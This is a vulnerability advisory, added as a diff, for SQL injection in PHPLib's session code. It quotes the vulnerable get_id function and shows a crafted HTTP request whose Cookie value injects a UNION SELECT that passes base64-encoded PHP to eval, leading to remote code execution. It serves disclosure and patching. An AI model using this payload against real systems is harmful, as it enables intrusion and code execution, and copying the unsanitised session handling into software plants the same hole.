@@ -1,0 +1,77 @@
+PHPLib SQL Injection
+
+Vendor: PHPLib
+Product: PHPLib
+Version: <= 7.4
+Website: http://phplib.sourceforge.net/
+
+BID: 16801 
+CVE: CVE-2006-0887 CVE-2006-2826 
+OSVDB: 23466 
+SECUNIA: 16902 
+
+Description:
+The PHP Base Library aka PHPLib is a toolkit for PHP developers supporting them in the development of Web applications. The phpLib codebase can be found in a number of applications available today. Unfortunately some of the session emulation code is vulnerable to SQL Injection issues that in a worst case scenario can lead to remote code execution by using UNION and selecting arbitrary php code into an eval call. A new version og PHPLib has been released and users should upgrade their PHPLib libraries as soon as possible. 
+
+
+Remote Code Execution:
+There are some serious security issues in phplib's session handling that may allow an attacker to perform a range of attacks such as SQL Injection, and/or Remote Code Execution. 
+## Propagate the session id according to mode and lifetime.
+## Will create a new id if necessary. To take over abandoned sessions,
+## one may provide the new session id as a parameter (not recommended).
+
+function get_id($id = "") {
+global $HTTP_COOKIE_VARS, $HTTP_GET_VARS, $HTTP_POST_VARS, $HTTP_SERVER_VARS;
+$this->newid=true;
+
+$this->name = $this->cookiename==""?$this->classname:$this->cookiename;
+
+if ( "" == $id ) {
+  $this->newid=false;
+  switch ($this->mode) {
+    case "get":
+      $id = isset($HTTP_GET_VARS[$this->name]) ?
+            $HTTP_GET_VARS[$this->name] :
+            ( isset($HTTP_POST_VARS[$this->name]) ?
+            $HTTP_POST_VARS[$this->name] :
+            "") ;
+    break;
+    case "cookie":
+      $id = isset($HTTP_COOKIE_VARS[$this->name]) ?
+            $HTTP_COOKIE_VARS[$this->name] : "";
+    break;
+    default:
+      die("This has not been coded yet.");
+    break;
+  }
+}
+
+### do not accept user provided ids for creation
+if($id != "" && $this->block_alien_sid) {   # somehow an id was provided by the user
+   if($this->that->ac_get_value($id, $this->name) == "") {
+      # no - the id doesn't exist in the database: Ignore it!
+      $id = "";
+   }
+}
+
+The above code is from sessions.inc @ lines 85-121. The variable $id gets it's values from either GET or COOKIE and is never made safe before being passed to the function ac_get_value() which uses the variable in a query, thus allowing for SQL Injection. However, it is possible to manipulate the query in a way that php code is returned and passed to a vulnerable eval call. 
+GET /phplib/pages/index.php3 HTTP/1.1
+Host: example.net
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Connection: keep-alive
+Cookie: Example_Session=' UNION SELECT 'cGhwaW5mbygpOw=='/*
+If-Modified-Since: Sat, 18 Feb 2006 18:24:34 GMT
+For example, the above request made to the index.php3 script that is shipped with phplib will successfully execute the phpinfo call. 
+
+
+Solution:
+PHPLib 7.4a has been released to address these issues. 
+
+
+Credits:
+James Bercegay of the GulfTech Security Research Team
